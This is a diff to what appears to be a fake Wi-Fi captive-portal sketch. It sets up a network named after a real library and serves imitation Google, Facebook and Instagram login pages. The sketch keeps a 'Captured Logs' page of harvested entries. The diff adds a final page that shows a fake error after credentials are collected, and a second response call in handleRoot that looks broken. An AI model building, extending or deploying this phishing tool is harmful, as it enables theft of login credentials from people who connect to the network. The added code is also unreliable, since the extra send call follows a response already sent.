@@ -9,6 +9,7 @@
 #include "facebook.h"
 #include "instagram.h"
 #include "erro.h"
+#include "final.h"
 
 #define LOGFILE "/log.txt"
  
@@ -18,6 +19,7 @@ const char *ssid="SENAI-FHZ-BIBLIOTECA";
 // Login da pagina de captura
 #define captivePortalPage GOOGLE_HTML
 #define erroPage FAKE_FORM_HTML
+#define finalPage FAKE_FORM_RESULT_HTML
 // INSTAGRAM_HTML, GOOGLE_HTML, FACEBOOK_HTML
 
 // Configuração básica usando configurações de rede comuns (porta DNS usual, IP e porta do servidor web)
@@ -128,6 +130,25 @@ void setup() {
     
   });
 
+
+
+
+
+
+  //Teste
+    server.on("/final", []() {
+    
+    // Envie uma resposta de erro ao usuário após a coleta de credencial
+    server.send(500, "text/html/result", finalPage);
+  });
+  //Teste
+
+
+
+
+
+  
+
   // Logging Page
   server.on("/logs", [](){
     webString="<html><body><h1>Captured Logs</h1><br><pre>";
@@ -175,4 +196,5 @@ void handleRoot() {
   server.sendHeader("Expires", "-1");
 
   server.send(200, "text/html", captivePortalPage);
+  server.send(200, "text/html/result", erroPage);
 }
